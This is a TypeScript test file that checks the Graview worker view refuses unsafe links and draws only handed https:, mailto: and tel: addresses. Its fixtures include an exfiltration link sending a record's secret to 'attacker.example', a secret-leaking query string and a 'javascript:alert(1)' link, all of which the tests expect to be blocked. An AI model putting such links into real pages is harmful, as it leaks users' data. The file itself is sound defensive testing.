// @vitest-environment jsdom
import { createSchema, defineNode, Store, z, type AnySchema, type Principal } from "@graview/core";
import { afterEach, describe, expect, it } from "vitest";
import { runWorkerViewHeadless } from "../../src/headless/index.js";
import { nodeIsolate } from "../../src/headless/node.js";
import { REGION_CSS } from "../../src/host/open-draw.js";
import { mountWorkerView, type MountWorkerViewOptions } from "../../src/host/view.js";
import { GUEST_PROTOCOL, type HostHello } from "../../src/protocol.js";

/*
 * A VIEW LINKS OUT ONLY TO AN ADDRESS IT WAS HANDED (Threat Watch,
 * 2026-10-21). Graview Cloud filed that a view could not draw a link to a
 * record's own `url` field: `<a href="https://…">` was refused ("<a> does
 * not take href") and the address drew as text.
 *
 * An `<a href>` is drawn now where its address is one the view was handed
 * — a value of a record it was shown, `https:`, `mailto:` or `tel:` — and,
 * where the host lists origins for links, any `https:` address on one of
 * them. Anything else is refused with a sentence. The host draws what it
 * keeps to open in a new tab, `rel="noopener noreferrer"`, with no
 * referrer, and says so: an arrow after it and "(opens in a new tab)" in
 * its name. The page is never navigated and learns nothing of the page.
 *
 * Why handed, not any `https:`: a view reads what the seat sees and can
 * write any string, so an open link is a way out — `https://elsewhere/?d=`
 * and whatever it read, one press away. An address the view was handed
 * carries nothing the view chose but which of them it links; an origin the
 * host lists is the host's choice, as it is for images.
 */
const advisory = defineNode("advisory", {
  fields: z.object({ label: z.string(), url: z.string(), contact: z.string(), phone: z.string(), secret: z.string() }),
  plural: "Advisories",
  label: (node) => node.label,
});
const schema = createSchema([advisory]);
const ADVISORY = { id: "advisory:xz", kind: "advisory", label: "xz backdoor", url: "https://www.openwall.com/lists/oss-security/2024/03/29/4", contact: "mailto:security@example.org", phone: "tel:+15551234567", secret: "s3cr3t" };
const store = () => new Store<AnySchema>({ schema: schema as AnySchema, mutations: [], policy: { grants: [] }, snapshot: { nodes: [ADVISORY], edges: [] } as never });
const reader: Principal = { kind: "human", id: "u:reader" };
const manifest = { name: "advisories", title: "Advisories", attach: "advisory", cardinality: "many" } as const;

/* The links a view draws: each an anchor by id, its address the view wrote. */
const LINKS = {
  handed: ADVISORY.url,
  mail: ADVISORY.contact,
  call: ADVISORY.phone,
  leaky: `${ADVISORY.url}?d=${ADVISORY.secret}`,
  elsewhere: `https://attacker.example/?d=${ADVISORY.secret}`,
  script: "javascript:alert(1)",
  data: "data:text/html,<p>hi</p>",
  plain: "http://www.openwall.com/lists/oss-security/2024/03/29/4",
  listed: "https://nvd.nist.gov/vuln/detail/CVE-2024-3094",
};
const markup = Object.entries(LINKS)
  .map(([id, href]) => `<a id="${id}" href="${href.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;")}">${id}</a>`)
  .join("");

class FakeWorker {
  static made: FakeWorker[] = [];
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: ((event: Event) => void) | null = null;
  posted: { message: unknown; transfer: unknown[] }[] = [];
  constructor(readonly url: string) {
    FakeWorker.made.push(this);
  }
  postMessage(message: unknown, transfer: unknown[] = []) {
    this.posted.push({ message, transfer });
  }
  terminate() {}
  say(data: unknown) {
    this.onmessage?.({ data } as MessageEvent);
  }
}
Object.assign(window, { Worker: FakeWorker });
Object.assign(window.URL, { createObjectURL: () => "blob:https://host.example/1", revokeObjectURL: () => undefined });

const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const live: { dispose(): void }[] = [];
afterEach(() => {
  for (const one of live.splice(0)) one.dispose();
  FakeWorker.made = [];
  document.body.replaceChildren();
});

let ids = 0;
const records = () => [
  [
    0,
    "~",
    {
      id: `x${(ids += 1)}`,
      type: 1,
      element: "div",
      attributes: {},
      children: Object.entries(LINKS).map(([id, href]) => ({ id: `x${(ids += 1)}`, type: 1, element: "a", attributes: { id, href }, children: [{ id: `x${(ids += 1)}`, type: 3, data: id }] })),
    },
    0,
  ],
];

/** The view on a page, drawing every link once it has been pushed what it is shown. */
async function onThePage(extra: Partial<MountWorkerViewOptions<AnySchema>> = {}) {
  const element = document.createElement("div");
  document.body.appendChild(element);
  const problems: string[] = [];
  const view = mountWorkerView(element, { manifest, worker: { script: "/* the view */" }, store: store(), principal: reader, onProblem: (said) => problems.push(said), ...extra });
  live.push(view);
  const worker = FakeWorker.made.at(-1)!;
  worker.say({ graview: "guest-ready", protocol: GUEST_PROTOCOL });
  const hello = worker.posted[0]!.message as HostHello;
  const port = worker.posted[0]!.transfer[0] as MessagePort;
  let pushed = false;
  port.onmessage = (event) => {
    const data = event.data as { type?: string; beat?: number; push?: number };
    if (data.type === "heartbeat") port.postMessage({ type: "heartbeat", nonce: hello.nonce, beat: data.beat });
    if (data.type === "props" && typeof data.push === "number") {
      pushed = true;
      port.postMessage({ type: "pushed", nonce: hello.nonce, push: data.push, ms: 1 });
    }
  };
  for (let i = 0; i < 50 && !pushed; i += 1) await wait(10);
  port.postMessage({ type: "render", nonce: hello.nonce, records: records() });
  for (let i = 0; i < 50 && !view.shadow.querySelector("#handed"); i += 1) await wait(10);
  await wait(20);
  return { at: (id: string) => view.shadow.querySelector(`#${id}`)!, problems, shadow: view.shadow };
}

describe("a view's link out", () => {
  it("is drawn to an address the view was handed — a record's https: url, mailto: and tel: — opening in a new tab, with no opener and no referrer", async () => {
    const { at } = await onThePage();
    for (const id of ["handed", "mail", "call"] as const) {
      expect(at(id).getAttribute("href"), id).toBe(new URL(LINKS[id]).href);
      expect(at(id).getAttribute("target"), id).toBe("_blank");
      expect(at(id).getAttribute("rel"), id).toBe("noopener noreferrer");
      expect(at(id).getAttribute("referrerpolicy"), id).toBe("no-referrer");
    }
  });

  it("says it opens elsewhere: an arrow after it, and in its name that it opens in a new tab", () => {
    expect(REGION_CSS).toMatch(/a\[href\]::after \{[^}]*content: " ↗" \/ " \(opens in a new tab\)"/);
  });

  it("is refused for an address the view made, even on a handed address's own site, and says why and what a view links to", async () => {
    const { at, problems } = await onThePage();
    for (const id of ["leaky", "elsewhere", "listed"] as const) expect(at(id).hasAttribute("href"), id).toBe(false);
    expect(problems).toContain(`The link "${LINKS.leaky}" was not drawn: it is no address this view was handed. A view links out only to an address a record it was shown holds (a url field), as the record holds it; a record or a place of this app is <a data-record> or <a data-place>.`);
    expect(problems.some((said) => said.startsWith(`The link "${LINKS.elsewhere}" was not drawn`))).toBe(true);
  });

  it("is refused for javascript:, data: and http: addresses, saying which schemes a link takes", async () => {
    const { at, problems } = await onThePage();
    for (const id of ["script", "data", "plain"] as const) expect(at(id).hasAttribute("href"), id).toBe(false);
    expect(problems).toContain(`The link "${LINKS.script}" was not drawn: a view links only to an https:, mailto: or tel: address.`);
    expect(problems).toContain(`The link "${LINKS.data}" was not drawn: a view links only to an https:, mailto: or tel: address.`);
    expect(problems).toContain(`The link "${LINKS.plain}" was not drawn: a view links only to an https:, mailto: or tel: address.`);
  });

  it("is drawn to any https: address on an origin the host lists for links, and to no other origin", async () => {
    const { at, problems } = await onThePage({ links: { origins: ["https://nvd.nist.gov"] } });
    expect(at("listed").getAttribute("href")).toBe(LINKS.listed);
    expect(at("elsewhere").hasAttribute("href")).toBe(false);
    expect(problems.find((said) => said.startsWith(`The link "${LINKS.elsewhere}"`))).toMatch(/or an https: address on https:\/\/nvd\.nist\.gov/);
  });

  it("is judged the same by a headless run: the handed ones drawn, the rest said as the page says them", async () => {
    const run = await runWorkerViewHeadless({ store: store(), principal: reader, run: nodeIsolate(), manifest, source: `graview.onProps(() => graview.render(${JSON.stringify(markup)}));` });
    expect(run.ok).toBe(true);
    if (!run.ok) return;
    const page = await onThePage();
    const said = run.description.problems.map((problem) => problem.says.replace(/^Not drawn: /, ""));
    for (const one of page.problems) expect(said).toContain(one);
    expect(said).toHaveLength(page.problems.length);
  });
});
